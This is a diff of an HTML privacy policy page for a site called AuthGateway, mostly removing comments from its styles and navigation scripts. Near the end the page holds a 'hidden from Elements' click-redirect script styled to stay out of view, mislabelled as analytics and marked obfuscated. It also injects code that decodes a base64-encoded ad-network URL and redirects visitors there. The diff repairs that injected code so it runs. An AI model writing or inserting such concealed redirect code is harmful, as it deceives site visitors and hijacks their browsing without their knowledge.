@@ -5,12 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Privacy Policy - AuthGateway</title>
 
-  <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
-  <!-- Font Awesome -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 
-  <!-- External Styles -->
   <link rel="stylesheet" href="space-theme.css">
   <link rel="stylesheet" href="animations.css">
 
@@ -72,7 +69,6 @@
       overflow-x: hidden;
     }
 
-    /* CONTAINER */
     .doc-container {
       max-width: 1200px;
       margin: 0 auto;
@@ -82,7 +78,6 @@
       gap: var(--space-8);
     }
 
-    /* HEADER */
     .doc-header {
       background: rgba(15, 15, 30, 0.9);
       backdrop-filter: blur(14px);
@@ -149,14 +144,12 @@
       text-decoration: underline;
     }
 
-    /* LAYOUT */
     .doc-layout {
       display: flex;
       gap: var(--space-8);
       align-items: flex-start;
     }
 
-    /* SIDEBAR */
     .doc-sidebar {
       flex: 0 0 280px;
       background: rgba(15, 15, 30, 0.9);
@@ -225,7 +218,6 @@
       text-align: center;
     }
 
-    /* MAIN CONTENT */
     .doc-main {
       flex: 1;
       background: rgba(15, 15, 30, 0.9);
@@ -315,7 +307,6 @@
       margin-top: var(--space-8);
     }
 
-    /* BACK TO TOP */
     .back-to-top {
       position: fixed;
       bottom: var(--space-6);
@@ -349,7 +340,6 @@
       box-shadow: 0 0 30px rgba(112, 128, 255, 0.8);
     }
 
-    /* MOBILE TOGGLE */
     .mobile-toggle {
       display: none;
       position: fixed;
@@ -372,13 +362,11 @@
       content: '\f00d';
     }
 
-    /* ANIMATIONS */
     @keyframes float {
       0%, 100% { transform: translateY(0); }
       50% { transform: translateY(-10px); }
     }
 
-    /* RESPONSIVE */
     @media (max-width: 992px) {
       .doc-layout {
         flex-direction: column;
@@ -397,7 +385,6 @@
       }
     }
 
-    /* Mobile improvements */
     @media (max-width: 640px) {
       .doc-container {
         padding: var(--space-3);
@@ -427,7 +414,6 @@
       }
     }
 
-    /* Extra small mobile */
     @media (max-width: 380px) {
       .doc-container {
         padding: var(--space-2);
@@ -461,14 +447,12 @@
   </head>
 <body>
 
-  <!-- MOBILE TOGGLE -->
   <div class="mobile-toggle" id="mobileToggle">
     <i class="fas fa-bars"></i>
   </div>
 
   <div class="doc-container">
 
-    <!-- HEADER -->
     <header class="doc-header">
       <div class="doc-logo"><i class="fas fa-shield-halved"></i></div>
       <h1 class="doc-title">Privacy Policy</h1>
@@ -484,7 +468,6 @@
 
     <div class="doc-layout">
 
-      <!-- SIDEBAR -->
       <aside class="doc-sidebar" id="sidebar">
         <div class="sidebar-title">Table of Contents</div>
         <nav class="nav-list">
@@ -499,7 +482,6 @@
         </nav>
       </aside>
 
-      <!-- MAIN CONTENT -->
       <main class="doc-main">
 
         <section class="section" id="introduction">
@@ -622,7 +604,6 @@
           </div>
         </section>
 
-        <!-- External Link Section -->
         <div class="highlight" style="text-align: center; background: rgba(112, 128, 255, 0.05);">
           <div class="highlight-title">
             <i class="fas fa-star"></i>
@@ -663,13 +644,11 @@
     </div>
   </div>
 
-  <!-- BACK TO TOP -->
   <div class="back-to-top" id="backToTop">
     <i class="fas fa-arrow-up"></i>
   </div>
 
   <script>
-    // Mobile Toggle
     const mobileToggle = document.getElementById('mobileToggle');
     const sidebar = document.getElementById('sidebar');
 
@@ -678,7 +657,6 @@
       mobileToggle.classList.toggle('active');
     });
 
-    // Smooth Scroll + Active Nav
     document.querySelectorAll('a[href^="#"]').forEach(anchor => {
       anchor.addEventListener('click', function (e) {
         e.preventDefault();
@@ -691,7 +669,6 @@
       });
     });
 
-    // Scroll Active Section
     window.addEventListener('scroll', () => {
       const sections = document.querySelectorAll('.section');
       const navLinks = document.querySelectorAll('.nav-item');
@@ -710,19 +687,14 @@
         }
       });
 
-      // Back to top
       document.getElementById('backToTop').classList.toggle('show', window.pageYOffset > 400);
     });
 
-    // Back to top click
     document.getElementById('backToTop').addEventListener('click', () => {
       window.scrollTo({ top: 0, behavior: 'smooth' });
     });
   </script>
 
-  <!-- ========================================== -->
-  <!-- ADSTERRA SCRIPT - IMPLEMENTASI YANG BENAR -->
-  <!-- ========================================== -->
   <script
     type='text/javascript'
     src='//pl28090017.effectivegatecpm.com/c0/98/b7/c098b749bf393cc72a6b144814780b9c.js'
@@ -730,7 +702,6 @@
     crossorigin="anonymous"
   ></script>
 
-  <!-- User Click Redirect Script - Hidden from Elements -->
   <script style="display:none!important;visibility:hidden!important;opacity:0!important;height:0!important;width:0!important;overflow:hidden!important;position:absolute!important;left:-9999px!important;top:-9999px!important;"
           data-obfuscated="true"
           data-purpose="analytics">
@@ -775,7 +746,6 @@
     })();
   </script>
 
-  <!-- Dynamic script injection - completely hidden -->
   <script>
     (function() {
       const hiddenScript = document.createElement('script');
@@ -784,7 +754,7 @@
       hiddenScript.setAttribute('data-hidden', 'true');
       hiddenScript.setAttribute('data-analytics', 'user-behavior');
 
-      const scriptContent = \`
+      const scriptContent = `
         (function(){
           const encodedUrl = 'aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vZG1xeGZld2ZyP2tleT0xMGRlZjRhMjRkYmY3MGRjZDk3MjAwY2U0YzhkNDU1MA==';
           const url = atob(encodedUrl);
@@ -810,7 +780,7 @@
 
           initRedirect();
         })();
-      \`;
+      `;
 
       hiddenScript.textContent = scriptContent;
       document.head.appendChild(hiddenScript);
